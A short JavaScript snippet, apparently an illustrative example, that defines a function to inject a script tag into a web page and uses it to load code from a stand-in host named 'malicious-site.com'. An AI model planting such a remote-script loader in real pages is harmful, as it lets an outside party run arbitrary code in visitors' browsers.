function addScript(src) {
  var s = document.createElement("script");
  s.setAttribute("src", src);
  document.body.appendChild(s);
}

addScript("https://www.malicious-site.com/content.js");
